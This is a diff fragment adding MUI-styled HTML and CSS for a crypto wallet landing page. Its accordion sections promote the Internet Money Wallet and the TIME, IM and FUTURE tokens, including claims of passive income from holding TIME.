+                  -webkit-transition: margin 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  transition: margin 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  overflow-anchor: none;
+                  border-radius: 0;
+                  max-width: 777px;
+                }
+
+                .css-5s2o83::before {
+                  position: absolute;
+                  left: 0;
+                  top: -1px;
+                  right: 0;
+                  height: 1px;
+                  content: "";
+                  opacity: 1;
+                  background-color: rgba(0, 0, 0, 0.12);
+                  -webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                    background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                    background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                }
+
+                .css-5s2o83:first-of-type::before {
+                  display: none;
+                }
+
+                .css-5s2o83.Mui-expanded::before {
+                  opacity: 0;
+                }
+
+                .css-5s2o83.Mui-expanded:first-of-type {
+                  margin-top: 0;
+                }
+
+                .css-5s2o83.Mui-expanded:last-of-type {
+                  margin-bottom: 0;
+                }
+
+                .css-5s2o83.Mui-expanded+.css-5s2o83.Mui-expanded::before {
+                  display: none;
+                }
+
+                .css-5s2o83.Mui-disabled {
+                  background-color: rgba(0, 0, 0, 0.12);
+                }
+
+                .css-5s2o83:first-of-type {
+                  border-top-left-radius: 4px;
+                  border-top-right-radius: 4px;
+                }
+
+                .css-5s2o83:last-of-type {
+                  border-bottom-left-radius: 4px;
+                  border-bottom-right-radius: 4px;
+                }
+
+                @supports (-ms-ime-align: auto) {
+                  .css-5s2o83:last-of-type {
+                    border-bottom-left-radius: 0;
+                    border-bottom-right-radius: 0;
+                  }
+                }
+
+                .css-5s2o83.Mui-expanded {
+                  margin: 16px 0;
+                }
+              </style>
+              <style data-emotion="css unto3p">
+                .css-unto3p {
+                  background-color: #fff;
+                  color: rgba(0, 0, 0, 0.87);
+                  -webkit-transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  border-radius: 4px;
+                  box-shadow: 0px 2px 1px -1px rgba(0, 0, 0, 0.2),
+                    0px 1px 1px 0px rgba(0, 0, 0, 0.14),
+                    0px 1px 3px 0px rgba(0, 0, 0, 0.12);
+                  position: relative;
+                  -webkit-transition: margin 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  transition: margin 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  overflow-anchor: none;
+                  border-radius: 0;
+                  max-width: 777px;
+                }
+
+                .css-unto3p::before {
+                  position: absolute;
+                  left: 0;
+                  top: -1px;
+                  right: 0;
+                  height: 1px;
+                  content: "";
+                  opacity: 1;
+                  background-color: rgba(0, 0, 0, 0.12);
+                  -webkit-transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                    background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  transition: opacity 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                    background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                }
+
+                .css-unto3p:first-of-type::before {
+                  display: none;
+                }
+
+                .css-unto3p.Mui-expanded::before {
+                  opacity: 0;
+                }
+
+                .css-unto3p.Mui-expanded:first-of-type {
+                  margin-top: 0;
+                }
+
+                .css-unto3p.Mui-expanded:last-of-type {
+                  margin-bottom: 0;
+                }
+
+                .css-unto3p.Mui-expanded+.css-unto3p.Mui-expanded::before {
+                  display: none;
+                }
+
+                .css-unto3p.Mui-disabled {
+                  background-color: rgba(0, 0, 0, 0.12);
+                }
+
+                .css-unto3p:first-of-type {
+                  border-top-left-radius: 4px;
+                  border-top-right-radius: 4px;
+                }
+
+                .css-unto3p:last-of-type {
+                  border-bottom-left-radius: 4px;
+                  border-bottom-right-radius: 4px;
+                }
+
+                @supports (-ms-ime-align: auto) {
+                  .css-unto3p:last-of-type {
+                    border-bottom-left-radius: 0;
+                    border-bottom-right-radius: 0;
+                  }
+                }
+
+                .css-unto3p.Mui-expanded {
+                  margin: 16px 0;
+                }
+              </style>
+              <div
+                class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation1 MuiAccordion-root MuiAccordion-rounded MuiAccordion-gutters css-unto3p">
+                <style data-emotion="css 1btcqi1">
+                  .css-1btcqi1 {
+                    display: -webkit-box;
+                    display: -webkit-flex;
+                    display: -ms-flexbox;
+                    display: flex;
+                    min-height: 48px;
+                    padding: 0px 16px;
+                    -webkit-transition: min-height 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                      background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    transition: min-height 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                      background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    border: 1px solid #323129;
+                    border-bottom: 2px solid #ffdb0c;
+                    border-radius: 0px !important;
+                    background: linear-gradient(180deg, #030404, #1a1c1c);
+                    padding-left: 3rem !important;
+                  }
+
+                  .css-1btcqi1.Mui-focusVisible {
+                    background-color: rgba(0, 0, 0, 0.12);
+                  }
+
+                  .css-1btcqi1.Mui-disabled {
+                    opacity: 0.38;
+                  }
+
+                  .css-1btcqi1:hover:not(.Mui-disabled) {
+                    cursor: pointer;
+                  }
+
+                  .css-1btcqi1.Mui-expanded {
+                    min-height: 64px;
+                  }
+
+                  .css-1btcqi1 h3 {
+                    font-size: 30px !important;
+                  }
+
+                  @media (max-width: 800px) {
+                    .css-1btcqi1 h3 {
+                      font-size: 25px !important;
+                    }
+                  }
+
+                  @media (max-width: 600px) {
+                    .css-1btcqi1 h3 {
+                      font-size: 21px !important;
+                    }
+                  }
+                </style>
+                <style data-emotion="css 1n66k2b">
+                  .css-1n66k2b {
+                    display: -webkit-inline-box;
+                    display: -webkit-inline-flex;
+                    display: -ms-inline-flexbox;
+                    display: inline-flex;
+                    -webkit-align-items: center;
+                    -webkit-box-align: center;
+                    -ms-flex-align: center;
+                    align-items: center;
+                    -webkit-box-pack: center;
+                    -ms-flex-pack: center;
+                    -webkit-justify-content: center;
+                    justify-content: center;
+                    position: relative;
+                    box-sizing: border-box;
+                    -webkit-tap-highlight-color: transparent;
+                    background-color: transparent;
+                    outline: 0;
+                    border: 0;
+                    margin: 0;
+                    border-radius: 0;
+                    padding: 0;
+                    cursor: pointer;
+                    -webkit-user-select: none;
+                    -moz-user-select: none;
+                    -ms-user-select: none;
+                    user-select: none;
+                    vertical-align: middle;
+                    -moz-appearance: none;
+                    -webkit-appearance: none;
+                    -webkit-text-decoration: none;
+                    text-decoration: none;
+                    color: inherit;
+                    display: -webkit-box;
+                    display: -webkit-flex;
+                    display: -ms-flexbox;
+                    display: flex;
+                    min-height: 48px;
+                    padding: 0px 16px;
+                    -webkit-transition: min-height 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                      background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    transition: min-height 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
+                      background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    border: 1px solid #323129;
+                    border-bottom: 2px solid #ffdb0c;
+                    border-radius: 0px !important;
+                    background: linear-gradient(180deg, #030404, #1a1c1c);
+                    padding-left: 3rem !important;
+                  }
+
+                  .css-1n66k2b::-moz-focus-inner {
+                    border-style: none;
+                  }
+
+                  .css-1n66k2b.Mui-disabled {
+                    pointer-events: none;
+                    cursor: default;
+                  }
+
+                  @media print {
+                    .css-1n66k2b {
+                      -webkit-print-color-adjust: exact;
+                      color-adjust: exact;
+                    }
+                  }
+
+                  .css-1n66k2b.Mui-focusVisible {
+                    background-color: rgba(0, 0, 0, 0.12);
+                  }
+
+                  .css-1n66k2b.Mui-disabled {
+                    opacity: 0.38;
+                  }
+
+                  .css-1n66k2b:hover:not(.Mui-disabled) {
+                    cursor: pointer;
+                  }
+
+                  .css-1n66k2b.Mui-expanded {
+                    min-height: 64px;
+                  }
+
+                  .css-1n66k2b h3 {
+                    font-size: 30px !important;
+                  }
+
+                  @media (max-width: 800px) {
+                    .css-1n66k2b h3 {
+                      font-size: 25px !important;
+                    }
+                  }
+
+                  @media (max-width: 600px) {
+                    .css-1n66k2b h3 {
+                      font-size: 21px !important;
+                    }
+                  }
+                </style>
+                <div class="MuiButtonBase-root MuiAccordionSummary-root MuiAccordionSummary-gutters css-1n66k2b"
+                  tabindex="0" role="button" aria-expanded="false">
+                  <style data-emotion="css l0jafl">
+                    .css-l0jafl {
+                      display: -webkit-box;
+                      display: -webkit-flex;
+                      display: -ms-flexbox;
+                      display: flex;
+                      -webkit-box-flex: 1;
+                      -webkit-flex-grow: 1;
+                      -ms-flex-positive: 1;
+                      flex-grow: 1;
+                      margin: 12px 0;
+                      -webkit-transition: margin 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                      transition: margin 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    }
+
+                    .css-l0jafl.Mui-expanded {
+                      margin: 20px 0;
+                    }
+                  </style>
+                  <div class="MuiAccordionSummary-content MuiAccordionSummary-contentGutters css-l0jafl">
+                    <style data-emotion="css qe64gg">
+                      .css-qe64gg {
+                        display: -webkit-box;
+                        display: -webkit-flex;
+                        display: -ms-flexbox;
+                        display: flex;
+                        -webkit-align-items: center;
+                        -webkit-box-align: center;
+                        -ms-flex-align: center;
+                        align-items: center;
+                        gap: 16px;
+                        margin-left: -8px;
+                      }
+                    </style>
+                    <div class="MuiBox-root css-qe64gg">
+                      <img alt="coin" loading="lazy" width="80" height="80" data-nimg="1" style="color: transparent"
+                        src="https://d295q1lbtarn4h.cloudfront.net/images/im-token.webp" />
+                      <style data-emotion="css 17gm3nn">
+                        .css-17gm3nn {
+                          margin: 0;
+                          font-size: 1.75rem;
+                          font-weight: bold;
+                          letter-spacing: -0.1rem;
+                          font-family: Gotham, Orbitron, sans-serif;
+                          line-height: 1.167;
+                          line-height: inherit;
+                          color: #ffdb0c;
+                        }
+
+                        @media (min-width: 600px) {
+                          .css-17gm3nn {
+                            font-size: 2.1422rem;
+                          }
+                        }
+
+                        @media (min-width: 900px) {
+                          .css-17gm3nn {
+                            font-size: 2.1422rem;
+                          }
+                        }
+
+                        @media (min-width: 1200px) {
+                          .css-17gm3nn {
+                            font-size: 2.3565rem;
+                          }
+                        }
+
+                        @media (min-width: 1536px) {
+                          .css-17gm3nn {
+                            font-size: 2.5707rem;
+                          }
+                        }
+                      </style>
+                      <h3 class="MuiTypography-root MuiTypography-h3 css-17gm3nn">
+                        Internet Money Wallet
+                      </h3>
+                    </div>
+                  </div>
+                  <style data-emotion="css 1fx8m19">
+                    .css-1fx8m19 {
+                      display: -webkit-box;
+                      display: -webkit-flex;
+                      display: -ms-flexbox;
+                      display: flex;
+                      color: rgba(0, 0, 0, 0.54);
+                      -webkit-transform: rotate(0deg);
+                      -moz-transform: rotate(0deg);
+                      -ms-transform: rotate(0deg);
+                      transform: rotate(0deg);
+                      -webkit-transition: -webkit-transform 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                      transition: transform 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    }
+
+                    .css-1fx8m19.Mui-expanded {
+                      -webkit-transform: rotate(180deg);
+                      -moz-transform: rotate(180deg);
+                      -ms-transform: rotate(180deg);
+                      transform: rotate(180deg);
+                    }
+                  </style>
+                  <div class="MuiAccordionSummary-expandIconWrapper css-1fx8m19">
+                    <style data-emotion="css 424f1s">
+                      .css-424f1s {
+                        -webkit-user-select: none;
+                        -moz-user-select: none;
+                        -ms-user-select: none;
+                        user-select: none;
+                        width: 1em;
+                        height: 1em;
+                        display: inline-block;
+                        fill: currentColor;
+                        -webkit-flex-shrink: 0;
+                        -ms-flex-negative: 0;
+                        flex-shrink: 0;
+                        -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                        transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                        font-size: 2.1875rem;
+                        color: #ffdb0c;
+                      }
+                    </style><svg class="MuiSvgIcon-root MuiSvgIcon-colorPrimary MuiSvgIcon-fontSizeLarge css-424f1s"
+                      focusable="false" aria-hidden="true" viewbox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                      <path d="m7 10 5 5 5-5z"></path>
+                    </svg>
+                  </div>
+                </div>
+                <style data-emotion="css a0y2e3">
+                  .css-a0y2e3 {
+                    height: 0;
+                    overflow: hidden;
+                    -webkit-transition: height 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    transition: height 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                    visibility: hidden;
+                  }
+                </style>
+                <div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-hidden css-a0y2e3"
+                  style="min-height: 0px">
+                  <style data-emotion="css hboir5">
+                    .css-hboir5 {
+                      display: -webkit-box;
+                      display: -webkit-flex;
+                      display: -ms-flexbox;
+                      display: flex;
+                      width: 100%;
+                    }
+                  </style>
+                  <div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
+                    <div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
+                      <div role="region" class="MuiAccordion-region">
+                        <style data-emotion="css sqr1ot">
+                          .css-sqr1ot {
+                            padding: 8px 16px 16px;
+                            background: #0d121e;
+                            padding: 1.5rem;
+                          }
+                        </style>
+                        <div class="MuiAccordionDetails-root css-sqr1ot">
+                          <style data-emotion="css zcof64">
+                            .css-zcof64 {
+                              margin: 0;
+                              font-size: 1.1875rem;
+                              font-family: Gotham;
+                              font-weight: 300;
+                              line-height: 1.75;
+                              line-height: inherit;
+                              color: rgba(138, 155, 180, 1);
+                            }
+
+                            @media (min-width: 600px) {
+                              .css-zcof64 {
+                                font-size: 1.2857rem;
+                              }
+                            }
+
+                            @media (min-width: 900px) {
+                              .css-zcof64 {
+                                font-size: 1.2857rem;
+                              }
+                            }
+
+                            @media (min-width: 1200px) {
+                              .css-zcof64 {
+                                font-size: 1.2857rem;
+                              }
+                            }
+
+                            @media (min-width: 1536px) {
+                              .css-zcof64 {
+                                font-size: 1.4286rem;
+                              }
+                            }
+
+                            @media (max-width: 599.95px) {
+                              .css-zcof64 {
+                                font-size: 17px;
+                              }
+                            }
+                          </style>
+                          <h6 class="MuiTypography-root MuiTypography-subtitle1 css-zcof64">
+                            The Internet Money Wallet does not collect ANY
+                            user data. No KYC required. Your wallet is your
+                            gateway to DeFi - send/receive/swap your favorite
+                            crypto assets. Connect to ALL EVM chains (with
+                            many pre-loaded). Track the price of ALL EVM
+                            tokens/coins. Connect to your favorite dApps and
+                            earn passive income by holding TIME!
+                          </h6>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation1 MuiAccordion-root MuiAccordion-rounded MuiAccordion-gutters css-unto3p">
+                <div class="MuiButtonBase-root MuiAccordionSummary-root MuiAccordionSummary-gutters css-1n66k2b"
+                  tabindex="0" role="button" aria-expanded="false">
+                  <div class="MuiAccordionSummary-content MuiAccordionSummary-contentGutters css-l0jafl">
+                    <style data-emotion="css j0ozid">
+                      .css-j0ozid {
+                        display: -webkit-box;
+                        display: -webkit-flex;
+                        display: -ms-flexbox;
+                        display: flex;
+                        -webkit-align-items: center;
+                        -webkit-box-align: center;
+                        -ms-flex-align: center;
+                        align-items: center;
+                        gap: 16px;
+                      }
+                    </style>
+                    <div class="MuiBox-root css-j0ozid">
+                      <img alt="coin" loading="lazy" width="64" height="64" data-nimg="1" style="color: transparent"
+                        src="https://d295q1lbtarn4h.cloudfront.net/images/time-token-small.webp" />
+                      <h3 class="MuiTypography-root MuiTypography-h3 css-17gm3nn">
+                        T.I.M.E. Dividend (TIME)
+                      </h3>
+                    </div>
+                  </div>
+                  <div class="MuiAccordionSummary-expandIconWrapper css-1fx8m19">
+                    <svg class="MuiSvgIcon-root MuiSvgIcon-colorPrimary MuiSvgIcon-fontSizeLarge css-424f1s"
+                      focusable="false" aria-hidden="true" viewbox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                      <path d="m7 10 5 5 5-5z"></path>
+                    </svg>
+                  </div>
+                </div>
+                <div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-hidden css-a0y2e3"
+                  style="min-height: 0px">
+                  <div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
+                    <div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
+                      <div role="region" class="MuiAccordion-region">
+                        <div class="MuiAccordionDetails-root css-sqr1ot">
+                          <h6 class="MuiTypography-root MuiTypography-subtitle1 css-zcof64">
+                            Holders of TIME earn passive income in PLS, ETH,
+                            BNB, MATIC, and AVAX. 100% of the fees generated
+                            from in-app swaps are distributed to TIME holders.
+                            No staking. No locking your TIME. Simply hold your
+                            TIME, and earn passive income. Available on
+                            Pulsechain, Ethereum, Base, BSC, Polygon,
+                            Avalanche, and Arbitrum.
+                          </h6>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation1 MuiAccordion-root MuiAccordion-rounded MuiAccordion-gutters css-unto3p">
+                <div class="MuiButtonBase-root MuiAccordionSummary-root MuiAccordionSummary-gutters css-1n66k2b"
+                  tabindex="0" role="button" aria-expanded="false">
+                  <div class="MuiAccordionSummary-content MuiAccordionSummary-contentGutters css-l0jafl">
+                    <div class="MuiBox-root css-j0ozid">
+                      <img alt="coin" loading="lazy" width="64" height="64" data-nimg="1" style="color: transparent"
+                        src="https://d295q1lbtarn4h.cloudfront.net/images/im-token-small.webp" />
+                      <h3 class="MuiTypography-root MuiTypography-h3 css-17gm3nn">
+                        Internet Money (IM)
+                      </h3>
+                    </div>
+                  </div>
+                  <div class="MuiAccordionSummary-expandIconWrapper css-1fx8m19">
+                    <svg class="MuiSvgIcon-root MuiSvgIcon-colorPrimary MuiSvgIcon-fontSizeLarge css-424f1s"
+                      focusable="false" aria-hidden="true" viewbox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                      <path d="m7 10 5 5 5-5z"></path>
+                    </svg>
+                  </div>
+                </div>
+                <div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-hidden css-a0y2e3"
+                  style="min-height: 0px">
+                  <div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
+                    <div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
+                      <div role="region" class="MuiAccordion-region">
+                        <div class="MuiAccordionDetails-root css-sqr1ot">
+                          <h6 class="MuiTypography-root MuiTypography-subtitle1 css-zcof64">
+                            The Internet Money (IM) token is deflationary,
+                            peer-to-peer, digital cash. It&#x27;s money, on
+                            the internet. Deflationary due to a buy and burn
+                            mechanic based on wallet swap volume! Completely
+                            decentralized. Available on Pulsechain, BSC and
+                            Ethereum.
+                          </h6>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation1 MuiAccordion-root MuiAccordion-rounded MuiAccordion-gutters css-unto3p">
+                <div class="MuiButtonBase-root MuiAccordionSummary-root MuiAccordionSummary-gutters css-1n66k2b"
+                  tabindex="0" role="button" aria-expanded="false">
+                  <div class="MuiAccordionSummary-content MuiAccordionSummary-contentGutters css-l0jafl">
+                    <div class="MuiBox-root css-j0ozid">
+                      <img alt="coin" loading="lazy" width="64" height="64" data-nimg="1" style="color: transparent"
+                        src="https://d295q1lbtarn4h.cloudfront.net/images/future-token-small.webp" />
+                      <h3 class="MuiTypography-root MuiTypography-h3 css-17gm3nn">
+                        Future T.I.M.E. Dividend (FUTURE)
+                      </h3>
+                    </div>
+                  </div>
+                  <div class="MuiAccordionSummary-expandIconWrapper css-1fx8m19">
+                    <svg class="MuiSvgIcon-root MuiSvgIcon-colorPrimary MuiSvgIcon-fontSizeLarge css-424f1s"
+                      focusable="false" aria-hidden="true" viewbox="0 0 24 24" data-testid="ArrowDropDownIcon">
+                      <path d="m7 10 5 5 5-5z"></path>
+                    </svg>
+                  </div>
+                </div>
+                <div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-hidden css-a0y2e3"
+                  style="min-height: 0px">
+                  <div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
+                    <div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
+                      <div role="region" class="MuiAccordion-region">
+                        <div class="MuiAccordionDetails-root css-sqr1ot">
+                          <h6 class="MuiTypography-root MuiTypography-subtitle1 css-zcof64">
+                            As TIME is launched on new EVM chains, 100% of the
+                            supply will be airdropped to FUTURE holders at a
+                            rate of 1:1 based on their FUTURE holdings. FUTURE
+                            is available on Ethereum and Pulsechain.
+                          </h6>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <style data-emotion="css c8dylx">
+          .css-c8dylx {
+            width: 100%;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-align-items: flex-start;
+            -webkit-box-align: flex-start;
+            -ms-flex-align: flex-start;
+            align-items: flex-start;
+            height: 100%;
+          }
+
+          @media (max-width: 899.95px) {
+            .css-c8dylx {
+              text-align: center;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-c8dylx">
+          <style data-emotion="css rgzikr">
+            .css-rgzikr {
+              display: -webkit-box;
+              display: -webkit-flex;
+              display: -ms-flexbox;
+              display: flex;
+              -webkit-box-pack: end;
+              -ms-flex-pack: end;
+              -webkit-justify-content: flex-end;
+              justify-content: flex-end;
+              position: relative;
+              width: 100%;
+              height: 100%;
+            }
+
+            .css-rgzikr img {
+              max-width: 898px;
+            }
+
+            @media (max-width: 1535.95px) {
+              .css-rgzikr img {
+                width: 95%;
+              }
+            }
+
+            @media (max-width: 1199.95px) {
+              .css-rgzikr img {
+                width: 120%;
+              }
+            }
+
+            @media (max-width: 1098px) {
+              .css-rgzikr {
+                -webkit-box-pack: center;
+                -ms-flex-pack: center;
+                -webkit-justify-content: center;
+                justify-content: center;
+                margin-left: -32px;
+                margin-bottom: 40px;
+              }
+
+              .css-rgzikr img {
+                width: 120%;
+              }
+            }
+
+            @media (max-width: 599.95px) {
+              .css-rgzikr {
+                margin-left: 0px;
+                margin-bottom: 0px;
+              }
+
+              .css-rgzikr img {
+                width: 110%;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-rgzikr">
+            <img src="building.webp" alt="building" />
+          </div>
+        </div>
+      </div>
+      <style data-emotion="css 1d1uvmx">
+        .css-1d1uvmx {
+          -webkit-flex-direction: row;
+          -ms-flex-direction: row;
+          flex-direction: row;
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-align-items: center;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+          -webkit-box-pack: space-evenly;
+          -ms-flex-pack: space-evenly;
+          -webkit-justify-content: space-evenly;
+          justify-content: space-evenly;
+          max-width: 1920px;
+          margin-left: auto;
+          margin-right: auto;
+          position: relative;
+          pointer-events: none;
+          margin-top: -160px;
+        }
+
+        @media (max-width: 899.95px) {
+          .css-1d1uvmx {
+            margin-top: -80px;
+          }
+        }
+
+        @media (max-width: 1800px) {
+          .css-1d1uvmx {
+            margin-top: 80px;
+          }
+        }
+
+        @media (max-width: 1500px) {
+          .css-1d1uvmx {
+            margin-top: 80px;
+          }
+        }
+
+        @media (max-width: 1098px) {
+          .css-1d1uvmx {
+            width: 90%;
+            -webkit-flex-direction: column-reverse;
+            -ms-flex-direction: column-reverse;
+            flex-direction: column-reverse;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+            -webkit-align-items: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            margin-top: -80px;
+          }
+        }
+
+        @media (max-width: 599.95px) {
+          .css-1d1uvmx {
+            margin-top: -200px;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-1d1uvmx">
+        <style data-emotion="css tjs59z">
+          .css-tjs59z {
+            width: 100%;
+            -webkit-flex: 1;
+            -ms-flex: 1;
+            flex: 1;
+            height: 100%;
+          }
+
+          @media (max-width: 1535.95px) {
+            .css-tjs59z {
+              -webkit-flex: 2;
+              -ms-flex: 2;
+              flex: 2;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-tjs59z">
+          <style data-emotion="css 1kcsibf">
+            .css-1kcsibf {
+              width: 100%;
+              max-width: 1200px;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              pointer-events: none;
+              -webkit-flex: 1;
+              -ms-flex: 1;
+              flex: 1;
+            }
+
+            .css-1kcsibf img {
+              max-width: 1200px;
+              position: relative;
+            }
+
+            @media (max-width: 1779px) {
+              .css-1kcsibf img {
+                width: 95%;
+              }
+            }
+
+            @media (max-width: 1098px) {
+              .css-1kcsibf {
+                display: -webkit-box;
+                display: -webkit-flex;
+                display: -ms-flexbox;
+                display: flex;
+                -webkit-box-pack: center;
+                -ms-flex-pack: center;
+                -webkit-justify-content: center;
+                justify-content: center;
+              }
+
+              .css-1kcsibf img {
+                margin-top: -96px;
+                width: 80%;
+                object-fit: contain;
+                object-position: center;
+              }
+            }
+
+            @media (max-width: 800px) {
+              .css-1kcsibf img {
+                width: 100%;
+                margin-left: 170px;
+              }
+            }
+
+            @media (max-width: 599.95px) {
+              .css-1kcsibf img {
+                width: 150%;
+                margin-top: -80px;
+                margin-left: 160px;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-1kcsibf">
+            <img src="images/phone-app.webp" alt="building" />
+          </div>
+        </div>
+        <style data-emotion="css 1b21nm0">
+          .css-1b21nm0 {
+            width: 100%;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-align-items: flex-start;
+            -webkit-box-align: flex-start;
+            -ms-flex-align: flex-start;
+            align-items: flex-start;
+            height: 100%;
+            -webkit-flex: 1;
+            -ms-flex: 1;
+            flex: 1;
+          }
+
+          @media (max-width: 899.95px) {
+            .css-1b21nm0 {
+              text-align: center;
+            }
+          }
+
+          @media (max-width: 1535.95px) {
+            .css-1b21nm0 {
+              -webkit-flex: 1.3;
+              -ms-flex: 1.3;
+              flex: 1.3;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-1b21nm0">
+          <style data-emotion="css 1p0m6bq">
+            .css-1p0m6bq {
+              position: relative;
+              padding-right: 112px;
+              -webkit-flex: 1;
+              -ms-flex: 1;
+              flex: 1;
+            }
+
+            @media (max-width: 1650px) {
+              .css-1p0m6bq {
+                padding-right: 8px;
+              }
+            }
+
+            @media (max-width: 1098px) {
+              .css-1p0m6bq {
+                -webkit-flex: 0.9;
+                -ms-flex: 0.9;
+                flex: 0.9;
+                margin-left: auto;
+                margin-right: auto;
+              }
+            }
+
+            @media (max-width: 899.95px) {
+              .css-1p0m6bq {
+                width: 90%;
+                padding-right: 0px;
+                margin: auto;
+              }
+
+              .css-1p0m6bq h1 {
+                margin-right: auto;
+                margin-left: 0px;
+              }
+            }
+
+            @media (max-width: 599.95px) {
+              .css-1p0m6bq {
+                margin-top: 40px;
+              }
+
+              .css-1p0m6bq h1 {
+                font-size: 35px;
+                letter-spacing: -2px;
+                margin-right: auto;
+                margin-left: 0px;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-1p0m6bq">
+            <style data-emotion="css 15v3gdt">
+              .css-15v3gdt {
+                margin: 0;
+                font-size: 3.625rem;
+                font-weight: bold;
+                letter-spacing: -0.25rem;
+                font-family: Gotham, Orbitron, sans-serif;
+                line-height: 1.167;
+                font-weight: 700;
+                color: white;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: left;
+                max-width: 1150px;
+                font-size: 82px;
+                z-index: 20;
+                position: relative;
+              }
+
+              @media (max-width: 767px) {
+                .css-15v3gdt {
+                  letter-spacing: -0.05rem;
+                }
+              }
+
+              @media (min-width: 600px) {
+                .css-15v3gdt {
+                  font-size: 4.7129rem;
+                }
+              }
+
+              @media (min-width: 900px) {
+                .css-15v3gdt {
+                  font-size: 5.1414rem;
+                }
+              }
+
+              @media (min-width: 1200px) {
+                .css-15v3gdt {
+                  font-size: 5.5698rem;
+                }
+              }
+
+              @media (min-width: 1536px) {
+                .css-15v3gdt {
+                  font-size: 6.2125rem;
+                }
+              }
+
+              .css-15v3gdt span {
+                color: #ffdb0c;
+                position: relative;
+              }
+
+              @media (max-width: 1258px) {
+                .css-15v3gdt {
+                  font-size: 70px;
+                }
+              }
+
+              @media (max-width: 899.95px) {
+                .css-15v3gdt {
+                  font-size: 60px;
+                }
+              }
+
+              @media (max-width: 599.95px) {
+                .css-15v3gdt {
+                  text-align: left;
+                  font-size: 35px;
+                  letter-spacing: -2px;
+                  margin-left: 0px;
+                }
+              }
+            </style>
+            <h2 class="MuiTypography-root MuiTypography-h1 css-15v3gdt">
+              The <span>Internet Money</span> Wallet
+            </h2>
+            <style data-emotion="css 1sbscf3">
+              .css-1sbscf3 {
+                position: absolute;
+                width: 350px;
+                height: auto;
+                top: 195px;
+                right: -95px;
+                border-radius: 50%;
+                background: rgba(1, 163, 254, 1);
+                -webkit-filter: blur(350px);
+                filter: blur(350px);
+                z-index: -10;
+              }
+            </style>
+            <div class="MuiBox-root css-1sbscf3"></div>
